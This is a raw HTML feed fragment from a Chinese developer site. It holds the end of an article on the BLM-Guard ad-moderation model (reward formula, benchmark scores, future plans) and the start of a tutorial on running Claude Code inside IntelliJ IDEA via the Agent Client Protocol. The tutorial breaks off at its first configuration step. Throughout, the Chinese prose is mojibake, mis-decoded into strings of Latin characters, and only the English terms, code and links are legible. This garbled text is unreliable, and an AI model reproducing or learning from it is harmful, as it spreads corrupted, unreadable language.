class="mord">â€‹</span></span></span></span></span></span>ã€‚</p>
<p>è¯„åˆ†é€»è¾‘: Critic é’ˆå¯¹æ¨ç†é“¾è¿›è¡Œæ‰“åˆ†ï¼ˆ0, 0.5, 1ï¼‰ï¼Œè®¡ç®—åŠ æƒå’Œï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>s</mi><mi>c</mi><mi>a</mi><mi>R</mi><mtext>â€‹</mtext><mo>=</mo><mo>âˆ‘</mo><mi>w</mi><mi>k</mi><mtext>â€‹</mtext><mo>â‹…</mo><mi>s</mi><mi>c</mi><mi>o</mi><mi>r</mi><mi>e</mi><mi>p</mi><mi>k</mi><mtext>â€‹</mtext></mrow><annotation encoding="application/x-tex">rscaRâ€‹=âˆ‘wkâ€‹â‹…scorepkâ€‹</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">rsc</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord">â€‹</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">â€‹</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal">score</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">â€‹</span></span></span></span></span>â€‹ã€‚è¿™è§£å†³äº†â€œåˆ¤å†³å¯¹äº†ä½†ç†ç”±é”™äº†â€çš„é€»è¾‘ä¸€è‡´æ€§é—®é¢˜ã€‚</p>
<h3 data-id="heading-6">2.3 æ€»ç»“</h3>
<p>ä»æŠ€æœ¯æ¶æ„è§’åº¦çœ‹ï¼ŒBLM-Guard çš„æ ¸å¿ƒå£å’åœ¨äºï¼š</p>
<ul>
<li>æ˜¾å¼å› æœå»ºæ¨¡ï¼š é€šè¿‡ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mi>L</mi></mrow><annotation encoding="application/x-tex">KL</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord mathnormal">L</span></span></span></span></span>æ•£åº¦å°†è§„åˆ™â€œæ³¨å…¥â€åˆ°æ¨¡å‹çš„éšç©ºé—´æ¨ç†è·¯å¾„ä¸­ã€‚</li>
<li>æŠ—ç­–ç•¥æ¼‚ç§»ï¼š åˆ©ç”¨<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>s</mi><mi>c</mi><mi>a</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">rscaR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">rsc</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></span>â€‹ åŠ¨æ€å¥–åŠ±ï¼Œä½¿å¾—æ¨¡å‹ä¸ä»…æ‹Ÿåˆæ•°æ®åˆ†å¸ƒï¼Œæ›´æ˜¯åœ¨æ‹Ÿåˆâ€œå®¡æ ¸é€»è¾‘â€ï¼Œä»è€Œé€‚åº”ä¸æ–­å˜åŒ–çš„ä¸šåŠ¡è§„åˆ™ã€‚</li>
</ul>
<h2 data-id="heading-7">ä¸‰ã€æ•ˆæœæ€§èƒ½</h2>
<h3 data-id="heading-8">3.1 æ ¸å¿ƒæŒ‡æ ‡</h3>
<p>åœ¨æ„å»ºçš„ BLM-Guard Benchmark ä»¥åŠ UCF ç­‰äº”ä¸ªå…¬å¼€æ•°æ®é›†ä¸Šï¼ŒBLM-Guard å‡å±•ç°äº† SOTAï¼ˆState-of-the-Artï¼‰æ€§èƒ½ã€‚</p>
<ol>
<li>
<p>å‡†ç¡®ç‡æå‡ï¼šç›¸æ¯” Qwen2.5-VLã€InternVL3-8B ç­‰å¼ºåŠ›åŸºçº¿ï¼ŒBLM-Guard åœ¨ä¸ƒå¤§é£é™©åœºæ™¯ä¸‹çš„ä¸¥æ ¼å‡†ç¡®ç‡ï¼ˆStrict Accuracyï¼‰ å¹³å‡æå‡è¶…è¿‡ 20%ï¼Œå°¤å…¶åœ¨â€œè™šå‡è¥é”€â€å’Œâ€œè¯¯å¯¼æ€§æ“ä½œâ€ç­‰é«˜éš¾åº¦åœºæ™¯è¡¨ç°çªå‡ºã€‚</p>
</li>
<li>
<p>æ¨ç†ä¸€è‡´æ€§ï¼šé€šè¿‡ GPT-4o è¿›è¡Œçš„ä¸€è‡´æ€§è¯„åˆ†æ˜¾ç¤ºï¼ŒBLM-Guard çš„æ¨ç†é€»è¾‘å¾—åˆ†è¾¾ 0.845ï¼Œè¶…åŸºçº¿æ¨¡å‹çš„ 0.5-0.6 æ°´å¹³ã€‚è¿™æ„å‘³ç€æ¨¡å‹ä¸ä»…åˆ¤å¾—å¯¹ï¼Œè€Œä¸”ç†ç”±å……åˆ†ã€é€»è¾‘è‡ªæ´½ã€‚</p>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee4fea6934dd4defb2c527cf4394e384~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5omL5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770277277&amp;x-signature=ONSOAzWZB%2B1vivZ8jjZGpyiKxFg%3D" alt="" loading="lazy"/></p>
<p>å›¾ 3 BLM-Guard Benchmark é£é™©åˆ†ç±»ä½“ç³»</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06cf1b9d5e174c729fde3a7b783f4ee8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5omL5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770277277&amp;x-signature=nCAIOHfGUJkTduMhP9umqvLNd90%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">3.2 æ¶ˆèå®éªŒ</h3>
<p>å®éªŒè¯æ˜ï¼Œâ€œè§„åˆ™å¾®è°ƒï¼ˆRule-SFTï¼‰+ SCA-R å¼ºåŒ–å­¦ä¹ â€ çš„ç»„åˆæ˜¯æ€§èƒ½æå‡çš„å…³é”®ã€‚ä»…ä¾é  SFTï¼Œæ¨¡å‹å®¹æ˜“äº§ç”Ÿå¹»è§‰ï¼›è€ŒåŠ å…¥ SCA-R åï¼Œæ¨¡å‹å­¦ä¼šäº†åœ¨ä¸ç¡®å®šæ—¶æ›´åŠ è°¨æ…ï¼Œæå‡äº†æ¨¡å‹çš„æ³›åŒ–æ•ˆæœã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5488373245054383ae8cdf0f8eb4fc50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5omL5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770277277&amp;x-signature=8R3GhXSyP5NEZiEcDDeYfkioKcY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-10">å››ã€æœªæ¥å±•æœ›</h2>
<p>å¿«æ‰‹å•†ä¸šç”Ÿæ€ä¸ä½“éªŒç ”å‘ä¸­å¿ƒå§‹ç»ˆè‡´åŠ›äºç”¨æŠ€æœ¯å®ˆæŠ¤å¿«æ‰‹å¹¿å‘Šçš„æ¸…æœ—ã€‚</p>
<p>æœªæ¥ï¼Œå›¢é˜Ÿå°†ç»§ç»­æ·±è€•ä»¥ä¸‹æ–¹å‘ï¼š</p>
<ol>
<li>
<p>ç†è§£+ç”Ÿæˆ OneModelï¼šæ¢ç´¢ç†è§£+ç”Ÿæˆæ·±åº¦èåˆçš„ oneModel æ–°èŒƒå¼ï¼Œè¿›ä¸€æ­¥ç²¾å‡†è¯†åˆ«è¿è§„å†…å®¹ï¼ŒåŒæ—¶å¼•å…¥è¥é”€è§†è§’ç”Ÿæˆé«˜è½¬åŒ–ã€æœ‰å¸å¼•åŠ›çš„ä¿®å¤å»ºè®®ï¼Œæå‡å•†å®¶ä½“éªŒï¼›</p>
</li>
<li>
<p>é£æ§å¤§æ¨¡å‹åŸºåº§ KwaiBLMï¼šè‡ªä¸»ç ”å‘ KwaiBLM é£æ§å¤§æ¨¡å‹åŸºåº§ï¼Œä½œä¸ºé£æ§é¢†åŸŸçš„ç»Ÿä¸€è®¤çŸ¥åº•åº§ï¼Œæ”¯æ’‘å†…å®¹ç†è§£ã€é£é™©è¯†åˆ«ã€ç­–ç•¥ç”Ÿæˆç­‰å¤šé¡¹æ ¸å¿ƒèƒ½åŠ›ï¼Œæ¨åŠ¨é£æ§ä»ç»éªŒé©±åŠ¨å‘æ•°æ®æ™ºèƒ½é©±åŠ¨è½¬å‹ï¼›</p>
</li>
<li>
<p>RiskAgent æ™ºèƒ½ä½“ï¼šæ„å»ºå¤š Agent åä½œçš„æ™ºèƒ½ä½“ç³»ç»Ÿï¼Œå»ºè®¾ä¸‹ä¸€ä»£äººæœºååŒçš„æ™ºèƒ½é£æ§å¼•æ“ RiskMatrixï¼Œæå‡ä¸šåŠ¡åœºæ™¯é£é™©é˜²æ§æ•ˆç‡ä¸é˜²æ§æ•ˆæœï¼›</p>
</li>
<li>
<p>Deepfake æ”»é˜²èƒ½åŠ›ï¼šé’ˆå¯¹ AI ç”Ÿæˆå†…å®¹å¸¦æ¥çš„æ–°å‹é£é™©ï¼Œæ„å»º Deepfake æ£€æµ‹ä¸å¯¹æŠ—æŠ€æœ¯ä½“ç³»ã€‚é€šè¿‡å¤šæ¨¡æ€ç‰¹å¾èåˆã€å†…å®¹ç†è§£ç­‰æŠ€æœ¯æ‰‹æ®µï¼Œæå‡è¯†åˆ« AI ç”Ÿæˆçš„è™šå‡ç´ æã€ç¯¡æ”¹å†…å®¹ã€åˆæˆè§†é¢‘ç­‰ï¼Œå®ˆæŠ¤å¹³å°å†…å®¹çœŸå®æ€§ï¼›</p>
</li>
<li>
<p>åŠ¨æ€å›¾ç®—æ³•ï¼šæ¢ç´¢èåˆå›¾ç¥ç»ç½‘ç»œä¸ Attention æœºåˆ¶ï¼Œå°† Graph RAG å›¾è¡¨å¾èƒ½åŠ›ä¸å¤§æ¨¡å‹ KwaiBLM ç›¸ç»“åˆæå‡è¯†åˆ«èƒ½åŠ›ï¼ŒæŒ–æ˜éšè”½å…³è”é£é™©ã€‚</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[IDEA é‡Œç»ˆäºèƒ½çˆ½ç”¨ Claude Codeäº†ï¼]]></title>    <link>https://juejin.cn/post/7599975633478647846</link>    <guid>https://juejin.cn/post/7599975633478647846</guid>    <pubDate>2026-01-28T09:31:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7599975633478647846" data-draft-id="7600068892988424202" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="IDEA é‡Œç»ˆäºèƒ½çˆ½ç”¨ Claude Codeäº†ï¼"/> <meta itemprop="keywords" content="Java,IntelliJ IDEA"/> <meta itemprop="datePublished" content="2026-01-28T09:31:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JavaGuide"/> <meta itemprop="url" content="https://juejin.cn/user/166781497383294"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            IDEA é‡Œç»ˆäºèƒ½çˆ½ç”¨ Claude Codeäº†ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/166781497383294/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JavaGuide
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-28T09:31:25.000Z" title="Wed Jan 28 2026 09:31:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¦‚æœä½ æ˜¯ JetBrains å®¶ IDE çš„é‡åº¦ç”¨æˆ·ï¼Œå¤§æ¦‚ç‡æœ‰è¿‡è¿™æ ·çš„ä½“éªŒï¼šæƒ³ç”¨ Claude Codeã€Codex è¿™ç±»ç»ˆç«¯ AI å·¥å…·æ—¶ï¼Œåªèƒ½åœ¨ Terminal é‡Œè·‘ç€ç”¨ã€‚è¿™äº› CLI å·¥å…·è™½å¼ºå¤§ï¼Œä½†ç¼ºå°‘åŸç”Ÿ UI äº¤äº’ï¼Œä½“éªŒä¸Šæœ‰äº›å±€é™ã€‚è™½ç„¶å¯ä»¥é€šè¿‡ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FGYaq_HNo5mKh2WjWtuEMyg" target="_blank" title="https://mp.weixin.qq.com/s/GYaq_HNo5mKh2WjWtuEMyg" ref="nofollow noopener noreferrer">Claude Code UI ç±»å¼€æºé¡¹ç›®</a>æ¥ç¼“è§£ï¼Œå¦‚ vibe kanbanã€1Codeï¼Œä½†åœ¨å†™ä»£ç è¿™ä»¶äº‹ä¸Šï¼Œæ²¡æœ‰ä»€ä¹ˆæ¯”â€œåœ¨ç†Ÿæ‚‰çš„ IDE é¢æ¿é‡Œç›´æ¥å¯¹è¯â€æ›´çˆ½äº†ã€‚</p>
<p>2025 å¹´åº•ï¼ŒJetBrains ç»™ AI Assistant æ’ä»¶æ›´æ–°äº†ä¸€ä¸ªé‡ç£…åŠŸèƒ½ï¼š<strong>æ”¯æŒè‡ªå®šä¹‰ ACPï¼ˆAgent Client Protocolï¼‰é…ç½®</strong>ã€‚è¿™æ„å‘³ç€ä½ ç°åœ¨å¯ä»¥æŠŠä»»ä½•æ”¯æŒ ACP çš„ Agent æ¥å…¥åˆ° AI Assistant é‡Œï¼ŒåŒ…æ‹¬ Claude Codeã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b21adaa0ed1472f9d1999a7dd3b10d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770197598&amp;x-signature=5EWb%2BjUyPlFLZS672hu19jqWQNg%3D" alt="" loading="lazy"/></p>
<p>è¿™ç¯‡æ–‡ç«  Guide å°±æ¥æ‰‹æŠŠæ‰‹å¸¦å¤§å®¶åœ¨ IDEA é‡Œé€šè¿‡ ACP çˆ½ç”¨ Claude Codeï¼Œå¸Œæœ›èƒ½ç»™å–œæ¬¢ IDEA çš„æœ‹å‹æä¾›ä¸€ä¸ªä¸ä¸€æ ·é€‰æ‹©ã€‚</p>
<blockquote>
<p><strong>éœ€è¦æ³¨æ„</strong>ï¼šç›®å‰ ACP è¿˜æ˜¯ Beta ç‰ˆï¼Œä½“éªŒä¸Šå¯èƒ½å­˜åœ¨ä¸€äº›å°é—®é¢˜ï¼ŒGuide åœ¨å‘¨æœ«ç”¨äº†ä¹‹åæ•´ä½“æ„Ÿè§‰è¿˜æ˜¯å¾ˆä¸é”™çš„ã€‚</p>
</blockquote>
<h2 data-id="heading-0">ACP æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>ACP å…¨ç§° <strong>Agent Client Protocol</strong>ï¼Œæ˜¯ä¸€ä¸ªå¼€æ”¾åè®®ï¼Œç”¨æ¥è§„èŒƒ AI Agent ä¸ä»£ç ç¼–è¾‘å™¨/IDE ä¹‹é—´çš„é€šä¿¡æ–¹å¼ã€‚å®ƒç±»ä¼¼äº Language Server Protocol (LSP)ï¼Œä½†ä¸“æ³¨äº AI ä»£ç†çš„é›†æˆï¼Œå¸®åŠ©å¼€å‘è€…åœ¨ä¸åŒç¼–è¾‘å™¨ä¸­ä½¿ç”¨å„ç§ AI å·¥å…·ï¼Œè€Œæ— éœ€ä¸ºæ¯ä¸ªç»„åˆæ„å»ºè‡ªå®šä¹‰é€‚é…å™¨ã€‚</p>
<p>ç®€å•ç†è§£ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªè®© AI Agent å’Œ IDE "å³æ’å³ç”¨"çš„é€šç”¨æ¥å£â€”â€”å°±åƒ USB-C ä¹‹äºè®¾å¤‡è¿æ¥ä¸€æ ·ã€‚</p>
<p>ACP ç”± Zed Industriesï¼ˆZed ç¼–è¾‘å™¨çš„å¼€å‘è€…ï¼‰ä¸»å¯¼å¼€å‘ï¼Œä¸ Anthropicã€Google ç­‰åˆä½œï¼ŒJetBrains ç›®å‰ä¹ŸåŠ å…¥äº†ã€‚</p>
<h3 data-id="heading-1">ä¸ºä»€ä¹ˆéœ€è¦ ACPï¼Ÿ</h3>
<p>åœ¨æ²¡æœ‰ ACP ä¹‹å‰ï¼Œæ¯ä¸ª AI Agent æƒ³æ¥å…¥æŸä¸ª IDEï¼Œéƒ½éœ€è¦å•ç‹¬å¼€å‘é€‚é…å™¨ã€‚Claude Code è¦å†™ä¸€å¥—ï¼ŒCursor è¦å†™ä¸€å¥—ï¼ŒWindsurf ä¹Ÿè¦å†™ä¸€å¥—â€”â€”é‡å¤é€ è½®å­ï¼Œè€Œä¸”ä¸€æ—¦ Agent æ›´æ–°ï¼Œé€‚é…å™¨è¿˜å¾—è·Ÿç€æ”¹ã€‚</p>
<p>ACP çš„æ ¸å¿ƒæ€è·¯æ˜¯ï¼š<strong>å®šä¹‰ä¸€å¥—æ ‡å‡†çš„é€šä¿¡åè®®ï¼Œä»»ä½• Agent åªè¦å®ç°äº† ACP Serverï¼Œä»»ä½• IDE åªè¦å®ç°äº† ACP Clientï¼Œä¸¤è€…å°±èƒ½ç›´æ¥å¯¹æ¥</strong>ã€‚</p>
<p>å…³äº ACP æ›´è¯¦ç»†çš„ä»‹ç»ï¼Œå¯ä»¥æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ï¼š<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fagentclientprotocol.com%2Foverview%2Fintroduction" target="_blank" title="https://agentclientprotocol.com/overview/introduction" ref="nofollow noopener noreferrer">agentclientprotocol.com/overview/inâ€¦</a></strong> ã€‚</p>
<h3 data-id="heading-2">ç”Ÿæ€ç°çŠ¶</h3>
<p>ç›®å‰åŠ å…¥ ACP ç”Ÿæ€çš„æˆå‘˜åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>IDE ç«¯</strong>ï¼šJetBrains å…¨å®¶æ¡¶ã€Zed ç­‰ã€‚</li>
<li><strong>Agent ç«¯</strong>ï¼šClaude Codeã€Codexã€Gemini CLIã€Kimi CLIã€Qoder CLI ç­‰ã€‚</li>
</ul>
<p>å°±è¿ Docker ä¹Ÿåœ¨ 2025 å¹´ 11 æœˆ 13 æ—¥å®£å¸ƒå°†å…¶å¼€æºå¤šä»£ç†è¿è¡Œæ—¶ cagent å†…ç½®åˆ° Docker Desktopï¼Œå¹¶æ”¯æŒ Agent Client Protocol (ACP)ï¼Œä»¥å®ç° AI ä»£ç†ä¸ IDE/ç¼–è¾‘å™¨ï¼ˆå¦‚ Zedã€VS Codeï¼‰çš„æ— ç¼é›†æˆã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcdb19228b9d477fb28062cb87937e1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770197598&amp;x-signature=4Q2bHBMysasvJxqvmj%2FzHrrwXCw%3D" alt="" loading="lazy"/></p>
<p>è¿™æ„å‘³ç€å¯ä»¥åœ¨å®¹å™¨åŒ–ç¯å¢ƒä¸­è¿è¡Œ AI ä»£ç†ï¼Œç®€åŒ–å¼€å‘å·¥ä½œæµï¼Œå¦‚ä»£ç ç”Ÿæˆã€æµ‹è¯•å’Œé‡æ„ï¼ŒåŒæ—¶ä¿æŒå®¹å™¨éš”ç¦»æ€§ã€‚</p>
<h3 data-id="heading-3">æŠ€æœ¯åŸç†</h3>
<p>ACP åº•å±‚åŸºäº <strong>JSON-RPC 2.0</strong> åè®®ï¼ˆä¸ LSP å®Œå…¨ç›¸åŒï¼‰ï¼ŒAgent ä½œä¸º Server è¿è¡Œä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ï¼ŒIDE é€šè¿‡ stdin/stdout ä¸ä¹‹é€šä¿¡ã€‚å¥½å¤„æ˜¯ Agent ä¸éœ€è¦è¢«æ‰“åŒ…è¿› IDE æ’ä»¶é‡Œï¼Œä¿æŒç‹¬ç«‹æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    subgraph IDE["IDE (ACP Client)"]
        AIAI["AI Assistant&lt;br/&gt;Plugin"]
    end

    subgraph ACP_Agent["ACP Agent Process"]
        ACPServer["ACP Server&lt;br/&gt;JSON-RPC"]
        LLM["AI Backend&lt;br/&gt;(Claude/GPT/...)"]
        Tools["MCP Tools&lt;br/&gt;Filesystem/Git/..."]
    end

    AIAI &lt;--&gt;|"stdin/stdout&lt;br/&gt;JSON-RPC"| ACPServer
    ACPServer --&gt; LLM
    ACPServer --&gt; Tools
</code></pre>
<h2 data-id="heading-4">å‰ç½®æ¡ä»¶</h2>
<p>è¦åœ¨ IDEA é‡Œç”¨ ACP æ¥å…¥ Claude Codeï¼Œéœ€è¦æ»¡è¶³ï¼š</p>
<ol>
<li><strong>IDE ç‰ˆæœ¬</strong>ï¼šIntelliJ IDEA 2024.2 åˆ° 2025.3.x æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚ACP æ”¯æŒä» 2025 å¹´åº•å¼€å§‹é€æ­¥é›†æˆï¼Œç¡®ä¿ä½ çš„ IDEA å·²æ›´æ–°åˆ°æ”¯æŒ ACP çš„æ„å»ºã€‚</li>
<li><strong>AI Assistant æ’ä»¶</strong>ï¼šç¡®ä¿å·²å®‰è£…å¹¶å¯ç”¨</li>
<li><strong>Claude Code</strong>ï¼šå·²å®‰è£…å¹¶èƒ½æ­£å¸¸è¿è¡Œ</li>
<li><strong>claude-code-acp</strong>ï¼šZed æä¾›çš„ ACP é€‚é…å™¨ï¼ˆä¸‹æ–‡ä¼šè®²å¦‚ä½•å®‰è£…ï¼‰</li>
</ol>
<p>ä½ å¯ä»¥æ£€æŸ¥ AI Assistant æ’ä»¶ç‰ˆæœ¬ï¼Œåœ¨ <code>File &gt; Settings &gt; Plugins</code> é‡Œæœç´¢ "JetBrains AI Assistant"ï¼Œç¡®è®¤ç‰ˆæœ¬å·åœ¨ 2025.12 ä¹‹åã€‚</p>
<h2 data-id="heading-5">é…ç½® ACP</h2>
<h3 data-id="heading-6">ç¬¬ä¸€æ­¥ï¼šæ‰¾åˆ°é…ç½®å…¥å£</h3>
